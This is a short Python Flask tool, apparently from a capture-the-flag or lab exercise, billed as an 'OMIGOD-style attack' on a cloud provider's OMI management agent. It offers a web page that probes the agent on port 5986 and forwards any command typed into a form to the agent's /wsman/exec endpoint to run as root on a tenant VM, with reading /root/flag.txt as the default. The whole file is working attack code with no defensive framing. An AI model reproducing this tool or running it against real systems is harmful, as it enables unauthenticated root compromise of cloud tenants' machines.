"""OMIGOD-style attack: scan for provider agents, RCE as root on tenant VM."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
AGENT = os.environ.get("AGENT_URL", "http://omi-agent:5986")

HTML = """<h1>Cloud Middleware Attack</h1>
<form method="post" action="/scan"><h3>1 · scan internal VMs for the agent</h3>
<button>Scan</button></form>
<form method="post" action="/exec"><h3>2 · execute as root on the VM</h3>
<input name="cmd" size="70" value="cat /root/flag.txt"><button>Run</button></form>
<pre>{{out}}</pre>"""


def render(out):
    return HTML.replace("{{out}}", out)


@app.route("/")
def home():
    return render("Ready")


@app.route("/scan", methods=["POST"])
def scan():
    r = requests.get(f"{AGENT}/health", timeout=8)
    return render(f"Scan result:\n  vm-b:5986 -> {r.text}")


@app.route("/exec", methods=["POST"])
def exec_cmd():
    cmd = request.form.get("cmd", "id")
    r = requests.post(f"{AGENT}/wsman/exec", json={"cmd": cmd}, timeout=10)
    return render(f"Command: {cmd}\n{r.text}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
